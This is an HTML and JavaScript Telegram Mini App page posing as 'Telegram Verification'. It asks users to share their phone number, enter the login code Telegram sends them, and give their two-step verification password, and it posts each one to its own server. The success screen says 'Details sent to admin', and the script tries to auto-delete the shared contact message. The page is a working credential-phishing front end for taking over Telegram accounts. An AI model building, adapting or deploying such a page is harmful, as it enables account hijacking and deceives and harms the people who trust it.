<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 400px; background: white; border-radius: 20px; overflow: hidden; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; text-align: center; }
        .header h1 { font-size: 22px; margin-bottom: 5px; }
        .header p { opacity: 0.9; font-size: 14px; }
        .content { padding: 25px; }
        .step { display: none; animation: fadeIn 0.3s; }
        .step.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .step-title { font-size: 18px; font-weight: 600; margin-bottom: 15px; color: #333; display: flex; align-items: center; gap: 10px; }
        .step-title .icon { font-size: 24px; }
        .info-box { background: #f8f9fa; border-radius: 12px; padding: 15px; margin-bottom: 20px; border-left: 4px solid #667eea; }
        .info-box p { color: #666; font-size: 14px; line-height: 1.5; }
        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s; margin-top: 10px; }
        .btn:hover { transform: translateY(-2px); opacity: 0.95; }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .contact-btn { background: #0088cc; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .back-btn { background: #f8f9fa; color: #666; }
        .otp-inputs { display: flex; gap: 10px; margin: 20px 0; justify-content: center; }
        .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 2px solid #e0e0e0; border-radius: 10px; transition: all 0.3s; }
        .otp-input:focus { border-color: #667eea; outline: none; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
        .loading { text-align: center; padding: 30px; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success { text-align: center; padding: 30px; }
        .success-icon { font-size: 60px; color: #4CAF50; margin-bottom: 20px; }
        .error { background: #ffebee; color: #c62828; padding: 12px; border-radius: 8px; margin-bottom: 15px; display: none; }
        .error.show { display: block; }
        .password-input { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 16px; margin-bottom: 15px; }
        #phone-display { font-weight: bold; text-align: center; margin: 10px 0; color: #333; }
    </style>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîê Telegram Verification</h1>
            <p>Secure WebApp Verification</p>
        </div>
        
        <div class="content">
            <!-- Step 1: Welcome -->
            <div class="step active" id="step1">
                <div class="step-title"><span class="icon">üëã</span>Welcome</div>
                <div class="info-box">
                    <p>Verify your Telegram account securely.</p>
                    <p><small>No messages in chat ‚Ä¢ Auto-delete contact</small></p>
                </div>
                <button class="btn" onclick="nextStep()">Start Verification</button>
            </div>
            
            <!-- Step 2: Contact -->
            <div class="step" id="step2">
                <div class="step-title"><span class="icon">üì±</span>Share Contact</div>
                <div class="info-box">
                    <p>Share your phone number to receive OTP.</p>
                    <p><small>The contact message will be auto-deleted</small></p>
                </div>
                <button class="btn contact-btn" onclick="shareContact()">üìû Share Contact</button>
                <button class="btn back-btn" onclick="prevStep()">Back</button>
            </div>
            
            <!-- Step 3: Loading -->
            <div class="step" id="step3">
                <div class="loading">
                    <div class="spinner"></div>
                    <p>Sending OTP...</p>
                    <p id="phone-info"></p>
                </div>
            </div>
            
            <!-- Step 4: OTP -->
            <div class="step" id="step4">
                <div class="step-title"><span class="icon">üî¢</span>Enter OTP</div>
                <div class="info-box">
                    <p>Enter 5-digit code sent to:</p>
                    <p id="phone-display"></p>
                    <p><small>Format: 9 4 3 8 0 or 94380</small></p>
                </div>
                <div class="error" id="otp-error"></div>
                <div class="otp-inputs">
                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
                </div>
                <button class="btn" onclick="verifyOTP()" id="verify-btn" disabled>Verify OTP</button>
                <button class="btn back-btn" onclick="goToStep(2)">Change Number</button>
            </div>
            
            <!-- Step 5: 2FA -->
            <div class="step" id="step5">
                <div class="step-title"><span class="icon">üîê</span>2FA Password</div>
                <div class="info-box">
                    <p>Enter 2FA password for:</p>
                    <p id="phone-display-2fa"></p>
                </div>
                <div class="error" id="password-error"></div>
                <input type="password" class="password-input" id="password-input" placeholder="2FA Password">
                <button class="btn" onclick="verifyPassword()">Verify Password</button>
                <button class="btn back-btn" onclick="goToStep(4)">Back</button>
            </div>
            
            <!-- Step 6: Success -->
            <div class="step" id="step6">
                <div class="success">
                    <div class="success-icon">‚úÖ</div>
                    <h2>Verified Successfully!</h2>
                    <p>Account verification complete.</p>
                    <p><small>Details sent to admin</small></p>
                    <button class="btn" onclick="closeApp()">Close</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentStep = 1;
        let sessionId = null;
        let webappId = null;
        let phoneNumber = '';
        let otpCode = '';
        
        // Initialize Telegram WebApp
        if (window.Telegram && Telegram.WebApp) {
            Telegram.WebApp.ready();
            Telegram.WebApp.expand();
            Telegram.WebApp.MainButton.hide();
            Telegram.WebApp.BackButton.hide();
            
            // Initialize WebApp session
            initWebApp();
        }
        
        async function initWebApp() {
            try {
                const user = Telegram.WebApp.initDataUnsafe?.user;
                const userId = user?.id || 'unknown';
                
                const response = await fetch('/api/init-webapp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id: userId })
                });
                
                const data = await response.json();
                if (data.success) {
                    webappId = data.webapp_id;
                }
            } catch (error) {
                console.log('WebApp init:', error);
            }
        }
        
        function nextStep() {
            document.querySelector('.step.active').classList.remove('active');
            currentStep++;
            document.getElementById(`step${currentStep}`).classList.add('active');
        }
        
        function prevStep() {
            document.querySelector('.step.active').classList.remove('active');
            currentStep--;
            document.getElementById(`step${currentStep}`).classList.add('active');
        }
        
        function goToStep(step) {
            document.querySelector('.step.active').classList.remove('active');
            currentStep = step;
            document.getElementById(`step${step}`).classList.add('active');
        }
        
        function shareContact() {
            if (window.Telegram && Telegram.WebApp) {
                // Share contact via Telegram WebApp
                Telegram.WebApp.shareContact();
            } else {
                alert('Please use Telegram app to share contact');
            }
        }
        
        // Handle contact data from Telegram
        if (window.Telegram && Telegram.WebApp) {
            // Listen for contact data
            Telegram.WebApp.onEvent('contactReceived', (contact) => {
                if (contact) {
                    handleContact(contact);
                }
            });
            
            // Alternative: listen for data from main button
            Telegram.WebApp.onEvent('mainButtonClicked', () => {
                Telegram.WebApp.shareContact();
            });
        }
        
        async function handleContact(contact) {
            if (!contact || !contact.phone_number) {
                showError('Please share valid contact');
                return;
            }
            
            phoneNumber = contact.phone_number;
            if (!phoneNumber.startsWith('+')) {
                phoneNumber = '+' + phoneNumber;
            }
            
            goToStep(3);
            document.getElementById('phone-info').textContent = `Phone: ${phoneNumber}`;
            
            try {
                const response = await fetch('/api/process-contact', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        phone: phoneNumber,
                        webapp_id: webappId,
                        first_name: contact.first_name || '',
                        last_name: contact.last_name || ''
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    sessionId = data.session_id;
                    document.getElementById('phone-display').textContent = phoneNumber;
                    document.getElementById('phone-display-2fa').textContent = phoneNumber;
                    goToStep(4);
                    
                    // Focus first OTP input
                    setTimeout(() => {
                        const firstInput = document.querySelector('.otp-input');
                        if (firstInput) firstInput.focus();
                    }, 100);
                    
                    // Auto-delete contact message if possible
                    if (window.Telegram && Telegram.WebApp) {
                        try {
                            Telegram.WebApp.sendData(JSON.stringify({
                                action: 'delete_contact'
                            }));
                        } catch (e) {}
                    }
                } else {
                    showError('otp-error', data.error || 'Failed to send OTP');
                    goToStep(2);
                }
            } catch (error) {
                showError('otp-error', 'Network error');
                goToStep(2);
            }
        }
        
        function moveToNext(input, nextIndex) {
            // Only numbers
            input.value = input.value.replace(/\D/g, '');
            
            // Update OTP code
            const inputs = document.querySelectorAll('.otp-input');
            otpCode = Array.from(inputs).map(input => input.value).join('');
            document.getElementById('verify-btn').disabled = otpCode.length !== 5;
            
            // Move focus
            if (input.value.length === 1 && nextIndex <= 5) {
                const nextInput = document.querySelector(`.otp-input:nth-child(${nextIndex})`);
                if (nextInput) nextInput.focus();
            }
        }
        
        async function verifyOTP() {
            if (otpCode.length !== 5) return;
            
            const verifyBtn = document.getElementById('verify-btn');
            verifyBtn.disabled = true;
            verifyBtn.textContent = 'Verifying...';
            
            try {
                const response = await fetch('/api/verify-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        session_id: sessionId,
                        otp: otpCode
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    if (data.requires_2fa) {
                        goToStep(5);
                    } else {
                        // Success
                        await fetch('/api/complete', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                session_id: sessionId,
                                phone: phoneNumber
                            })
                        });
                        goToStep(6);
                    }
                } else {
                    showError('otp-error', data.error);
                    verifyBtn.disabled = false;
                    verifyBtn.textContent = 'Verify OTP';
                }
            } catch (error) {
                showError('otp-error', 'Network error');
                verifyBtn.disabled = false;
                verifyBtn.textContent = 'Verify OTP';
            }
        }
        
        async function verifyPassword() {
            const password = document.getElementById('password-input').value.trim();
            if (!password) {
                showError('password-error', 'Enter 2FA password');
                return;
            }
            
            const btn = document.querySelector('#step5 .btn');
            btn.disabled = true;
            btn.textContent = 'Verifying...';
            
            try {
                const response = await fetch('/api/verify-2fa', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        session_id: sessionId,
                        password: password
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // Success with 2FA
                    await fetch('/api/complete', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            session_id: sessionId,
                            phone: phoneNumber,
                            has_2fa: true
                        })
                    });
                    goToStep(6);
                } else {
                    showError('password-error', data.error || 'Wrong password');
                    btn.disabled = false;
                    btn.textContent = 'Verify Password';
                }
            } catch (error) {
                showError('password-error', 'Network error');
                btn.disabled = false;
                btn.textContent = 'Verify Password';
            }
        }
        
        function showError(elementId, message) {
            const element = document.getElementById(elementId);
            if (element) {
                element.textContent = message;
                element.classList.add('show');
                setTimeout(() => element.classList.remove('show'), 5000);
            }
        }
        
        function closeApp() {
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.close();
            }
        }
        
        // Initialize first step
        document.addEventListener('DOMContentLoaded', function() {
            // Set Telegram theme if available
            if (window.Telegram && Telegram.WebApp) {
                const theme = Telegram.WebApp.colorScheme;
                if (theme === 'dark') {
                    document.body.style.background = '#0f0f23';
                    document.querySelector('.container').style.background = '#1c1c1c';
                    document.querySelector('.container').style.color = '#fff';
                }
            }
        });
    </script>
</body>
    </html>
